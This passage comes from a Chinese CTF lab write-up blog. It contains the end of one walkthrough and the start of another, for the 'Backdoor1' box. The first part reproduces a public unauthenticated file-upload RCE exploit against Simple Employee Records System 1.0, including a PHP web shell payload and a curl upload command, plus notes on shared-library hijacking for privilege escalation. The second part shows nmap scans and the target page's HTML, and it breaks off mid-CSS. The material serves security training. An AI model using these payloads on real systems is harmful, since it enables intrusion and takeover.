bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yulian@sML:~$ ./get_root<br>Starting get_root program...<br>root@sML:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(yulian)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@sML:/root# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-4c850c5b3b2756e67a91bad8e046ddac&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、employee-records-system漏洞"><a href="#1、employee-records-system漏洞" class="headerlink" title="1、employee_records_system漏洞"></a>1、employee_records_system漏洞</h2><p><a href="https://www.exploit-db.com/exploits/49596">https://www.exploit-db.com/exploits/49596</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Exploit Title: Simple Employee Records System 1.0 - File Upload RCE (Unauthenticated)</span><br><span class="hljs-comment"># Date: 2021-02-25</span><br><span class="hljs-comment"># Exploit Author: sml@lacashita.com</span><br><span class="hljs-comment"># Vendor Homepage: https://www.sourcecodester.com/php/11393/employee-records-system.html</span><br><span class="hljs-comment"># Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip</span><br><span class="hljs-comment"># Version: v1.0</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04.2</span><br><br>uploadID.php can be used to upload .php files to <br><span class="hljs-string">&#x27;/uploads/employees_ids/&#x27;</span> without authentication.<br><br>POC<br>---<br><br>1) Make the following Request changing the <span class="hljs-string">&quot;Host:&quot;</span> to your Victim IP.<br><br>POST /dashboard/uploadID.php HTTP/1.1<br>Host: 192.168.1.117<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 <br>Firefox/78.0<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>X-Requested-With: XMLHttpRequest<br>Content-Type: multipart/form-data; <br>boundary=---------------------------5825462663702204104870787337<br>Content-Length: 267<br>DNT: 1<br>Connection: close<br><br>-----------------------------5825462663702204104870787337<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;employee_ID&quot;</span>; filename=<span class="hljs-string">&quot;cmd2.php&quot;</span><br>Content-Type: image/png<br>&lt;?php<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>system(<span class="hljs-variable">$cmd</span>);<br>?&gt;<br>-----------------------------5825462663702204104870787337--<br><br><br>2) You will get the response with the name of the uploaded file <br>(upload_filename).<br><br>HTTP/1.1 200 OK<br>Server: nginx/1.18.0 (Ubuntu)<br>Date: Thu, 25 Feb 2021 19:17:55 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Content-Length: 77<br>&#123;<span class="hljs-string">&quot;upload_filename&quot;</span>:<span class="hljs-string">&quot;Ag1rzKFWTlnCZhL_cmd2.php&quot;</span>,<span class="hljs-string">&quot;selected_filename&quot;</span>:<span class="hljs-string">&quot;cmd2.php&quot;</span>&#125;<br><br>3) Your file will be located <span class="hljs-keyword">in</span>: <br>http://VICTIM_IP/uploads/employees_ids/Ag1rzKFWTlnCZhL_cmd2.php<br><br>4) In this example, to run commands:<br>http://192.168.1.117/uploads/employees_ids/Ag1rzKFWTlnCZhL_cmd2.php?cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>或者使用<code>curl</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.2.52/dashboard/uploadID.php -X POST -F <span class="hljs-string">&#x27;employee_ID=@rev.php;filename=rev.php&#x27;</span> <br></code></pre></td></tr></table></figure><h2 id="2、重写库提权"><a href="#2、重写库提权" class="headerlink" title="2、重写库提权"></a>2、重写库提权</h2><p>查看文件引用的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd &lt;文件名&gt;<br></code></pre></td></tr></table></figure><p>编译文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC -o &lt;编译好的库名.so&gt; &lt;需要编译的文件.c&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>employee_records_system</tag>
      
      <tag>提权-库文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Backdoor1</title>
    <link href="/Maze-sec/Backdoor1/"/>
    <url>/Maze-sec/Backdoor1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-09 20:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00051s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:20:06:89 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.51<br>Host is up (0.00037s latency).<br>MAC Address: 08:00:27:09:A1:B6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.01 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.51</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# nmap --min-rate 10000 -p- 192.168.2.51                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-09 20:17 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.51<br>Host is up (0.00023s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:09:A1:B6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.91 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.51<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-09 20:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.51<br>Host is up (0.00050s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Backdoor1 :: Cyberpunk Style<br>MAC Address: 08:00:27:09:A1:B6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.90 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# nmap -sU --top-ports 100 192.168.2.51                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-09 20:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.51<br>Host is up (0.00060s latency).<br>All 100 scanned ports on 192.168.2.51 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:09:A1:B6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 49.63 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，找到一个提示<code>BACKDOOR ACCESS ACTIVATED! Requires privileged credentials</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/backdoor1]<br>└─# curl http://192.168.2.51                    <br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Backdoor1 :: Cyberpunk Style&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            margin: 0;<br>            padding: 0;<br>            font-family: <span class="hljs-string">&#x27;Arial&#x27;</span>, sans-serif;<br>            background: <span class="hljs-comment">#000 url(&#x27;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCI+CjxyZWN0IHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgZmlsbD0iIzAwMCI+PC9yZWN0Pgo8Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIxMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZmYwMGIzIiBzdHJva2Utd2lkdGg9IjEiPjwvY2lyY2xlPgo8Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIxNSIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjYjMwMGZmIiBzdHJva2Utd2lkdGg9IjEiPjwvY2lyY2xlPgo8L3N2Zz4=&#x27;);</span><br>            color: <span class="hljs-comment">#FF00B3;</span><br>            text-shadow: 0 0 10px <span class="hljs-comment">#FF00B3, 0 0 20px #FF00B3;</span><br>            overflow-x: hidden;<br>            line-height: 1.6;<br>        &#125;<br><br>        @keyframes blink &#123;<br>            0% &#123; opacity: 1; &#125;<br>            50% &#123; opacity: 0.3; &#125;<br>            100% &#123; opacity: 1; &#125;<br>        &#125;<br><br>        @keyframes glow &#123;<br>            0% &#123; text-shadow: 0 0 10px <span class="hljs-comment">#FF00B3, 0 0 20px #FF00B3; &#125;</span><br>            50% &#123; text-shadow: 0 0 20px <span class="hljs-comment">#FF00B3, 0 0 30px #B300FF; &#125;</span><br>            100% &#123; text-shadow: 0 0 10px <span class="hljs-comment">#FF00B3, 0 0 20px #FF00B3; &#125;</span><br>        &#125;<br><br>        @keyframes spin &#123;<br>            0% &#123; transform: rotate(0deg); &#125;<br>            100% &#123; transform: rotate(360deg); &#125;<br>        &#125;<br><br>        header &#123;<br>            background: linear-gradient(135deg, <span class="hljs-comment">#B300FF 0%, #000 50%, #FF00B3 100%);</span><br>            border-bottom: 5px double <span class="hljs-comment">#00FFFF;</span><br>            padding: 20px;<br>            text-align: center;<br>            position: relative;<br>            overflow: hidden;<br>        &#125;<br><br>        header::before &#123;<br>            content: <span class="hljs-string">&quot;&quot;</span>;<br>            position: absolute;<br>            top: -10px;<br>            left: 0;<br>            width: 100%;<br>            height: 20px;<br>            background: linear-gradient(90deg, <br>                <span class="hljs-comment">#FF00B3, #00FFFF, #00FF00, #FFFF00, #FF00B3);</span><br>            animation: glow 3s infinite;<br>        &#125;<br><br>        h1 &#123;<br>            font-size: 4em;<br>            margin: 10px 0;<br>            text-transform: uppercase;<br>            letter-spacing: 5px;<br>            animation: glow 2s infinite;<br>            font-weight: bold;<br>        &#125;<br><br>        .subtitle &#123;<br>            font-size: 1.8em;<br>            margin: 10px 0 30px;<br>            color: <span class="hljs-comment">#00FFFF;</span><br>            text-shadow: 0 0 10px <span class="hljs-comment">#00FFFF;</span><br>            animation: blink 1.5s infinite;<br>        &#125;<br><br>        nav &#123;<br>            background: rgba(0, 0, 0, 0.7);<br>            border: 2px solid <span class="hljs-comment">#00FFFF;</span><br>            padding: 15px;<br>            margin: 20px auto;<br>            max-width: 800px;<br>            border-radius: 30px;<br>        &#125;<br><br>        nav ul &#123;<br>            display: flex;<br>            justify-content: center;<br>            padding: 0;<br>            margin: 0;<br>            list-style: none;<br>        &#125;<br><br>        nav li &#123;<br>            margin: 0 20px;<br>        &#125;<br><br>        nav a &#123;<br>            color: <span class="hljs-comment">#FFFF00;</span><br>            text-decoration: none;<br>            font-size: 1.4em;<br>            padding: 5px 15px;<br>            border: 1px dashed <span class="hljs-comment">#FFFF00;</span><br>            border-radius: 15px;<br>            transition: all 0.3s;<br>            animation: blink 3s infinite;<br>        &#125;<br><br>        nav a:hover &#123;<br>            background: <span class="hljs-comment">#FFFF00;</span><br>            color: <span class="hljs-comment">#000;</span><br>            text-shadow: none;<br>            border-style: solid;<br>            animation: none;<br>        &#125;<br><br>        main &#123;<br>            padding: 20px;<br>            max-width: 900px;<br>            margin: 0 auto;<br>        &#125;<br><br>        .section &#123;<br>            background: rgba(0, 0, 0, 0.6);<br>            border: 3px solid;<br>            border-image: linear-gradient(45deg, <span class="hljs-comment">#FF00B3, #00FFFF, #00FF00) 1;</span><br>            padding: 25px;<br>            margin: 30px 0;<br>            border-radius: 20px;<br>            position: relative;<br>        &#125;<br><br>        .section::before &#123;<br>            content: <span class="hljs-string">&quot;&quot;</span>;<br>            position: absolute;<br>            top: -15px;<br>            left: -15px;<br>            width: 40px;<br>            height: 40px;<br>            border: 3px solid <span class="hljs-comment">#00FFFF;</span><br>            border-radius: 50%;<br>            animation: spin 10s infinite linear;<br>        &#125;<br><br>        .section h2 &#123;<br>            color: <span class="hljs-comment">#00FF00;</span><br>            text-shadow: 0 0 15px <span class="hljs-comment">#00FF00;</span><br>            font-size: 2.5em;<br>            margin-top: 0;<br>            border-bottom: 2px dotted <span class="hljs-comment">#00FF00;</span><br>            padding-bottom: 15px;<br>        &#125;<br><br>        p &#123;<br>            font-size: 1.2em;<br>            color: <span class="hljs-comment">#FFFF00;</span><br>        &#125;<br><br>        .highlight &#123;<br>            color: <span class="hljs-comment">#00FFFF;</span><br>            text-shadow: 0 0 10px <span class="hljs-comment">#00FFFF;</span><br>            font-weight: bold;<br>        &#125;<br><br>        .floating &#123;<br>            position: absolute;<br>            animation: <span class="hljs-built_in">float</span> 6s infinite ease-in-out;<br>        &#125;<br><br>        .spinning &#123;<br>            animation: spin 20s infinite linear;<br>        &#125;<br><br>        <span class="hljs-comment">#floating1 &#123;</span><br>            top: 20%;<br>            left: 10%;<br>            font-size: 3em;<br>            transform: rotate(-20deg);<br>        &#125;<br><br>        <span class="hljs-comment">#floating2 &#123;</span><br>            top: 40%;<br>            right: 15%;<br>            font-size: 3em;<br>            transform: rotate(15deg);<br>        &#125;<br><br>        <span class="hljs-comment">#floating3 &#123;</span><br>            bottom: 25%;<br>            left: 20%;<br>            font-size: 3em;<br>            transform: rotate(-10deg);<br>        &#125;<br><br>        @keyframes <span class="hljs-built_in">float</span> &#123;<br>            0% &#123; transform: translateY(0) rotate(-20deg); &#125;<br>            50% &#123; transform: translateY(-20px) rotate(-15deg); &#125;<br>            100% &#123; transform: translateY(0) rotate(-20deg); &#125;<br>        &#125;<br><br>        code &#123;<br>            background: rgba(0, 0, 0, 0.5);<br>            border: 1px solid <span class="hljs-comment">#00FF00;</span><br>            padding: 15px;<br>            display: block;<br>            margin: 15px 0;<br>            font-family: monospace;<br>            color: <span class="hljs-comment">#00FFFF;</span><br>            border-left: 5px solid <span class="hljs-comment">#FF00B3;</span><br>            overflow-x: auto;<br>            border-radius: 10px;<br>        &#125;<br><br>        .btn &#123;<br>            display: inline-block;<br>            background: linear-gradient(45deg, <span class="hljs-comment">#FF00B3, #00FFFF);</span><br>            color: <span class="hljs-comment">#000;</span><br>            text-decoration: none;<br>            padding: 10px 30px;<br>            border-radius: 50px;<br>            font-weight: bold;<br>            text-transform: uppercase;<br>            font-size: 1.2em;<br>            border: none;<br>            cursor: pointer;<br>            margin: 10px 5px;<br>            animation: glow 2s infinite;<br>        &#125;<br><br>        .btn:hover &#123;<br>            background: linear-gradient(45deg, <span 